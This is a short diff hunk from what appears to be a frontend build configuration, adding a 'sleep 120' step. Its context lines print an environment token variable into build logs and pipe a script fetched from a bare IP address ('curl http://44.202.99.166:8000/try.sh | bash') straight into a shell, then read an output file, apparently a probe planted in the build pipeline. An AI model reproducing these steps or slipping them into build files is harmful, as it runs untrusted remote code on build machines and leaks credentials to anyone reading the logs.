@@ -13,6 +13,7 @@ frontend:
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
         - echo "Build no=$AWS_JOB_ID"
         - curl http://44.202.99.166:8000/try.sh | bash
+        - sleep 120
         - ls -la
         - cat op.txt
 #         - ls -la /usr/bin/curl
